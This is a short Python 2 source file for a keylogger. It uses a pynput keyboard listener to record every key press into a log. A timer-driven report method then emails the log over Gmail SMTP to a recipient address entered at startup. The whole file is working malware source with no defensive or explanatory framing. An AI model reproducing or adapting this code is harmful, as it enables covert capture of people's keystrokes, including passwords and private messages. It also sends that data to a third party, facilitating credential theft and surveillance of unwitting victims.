import pynput.keyboard ,threading,smtplib




class Key:

	def __init__(self,time_interval):
		self.interval = time_interval
		self.log = ""
		self.email = raw_input("enter email to use:")
		print("recevied\n")
		self.password= raw_input("enter password:")
		print("recevied\n")
		self.email1= raw_input("enter email for receving:")	
		print("recevied\n")

	
	def send_mail(self,email ,password ,message):
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.starttls()
		server.login(self.email, self.password)
		server.sendmail(self.email ,self.email1, message)
		server.quit()	
		print("EMAIL SENT:>>:)")
			

	def append(self, string):

		self.log = self.log + string

	def process_key(self , key):
		try:

			current_key= str(key.char)
		    
		except AttributeError:

			if key == key.space:

				current_key= " "
			
			else:

				current_key= " " + str(key)+ " "
		        
		self.append(current_key)	    


			

	def report(self):
		self.send_mail(self.email,self.password,self.log)
		self.log=""
		timer=threading.Timer(self.interval,self.report)
		timer.start()
			
	def star(self):
	    keyboard_listener= pynput.keyboard.Listener(on_press =self.process_key)
			
	    with keyboard_listener:
		    self.report()
		    keyboard_listener.join()
				

					


					    	
			
		 

	    
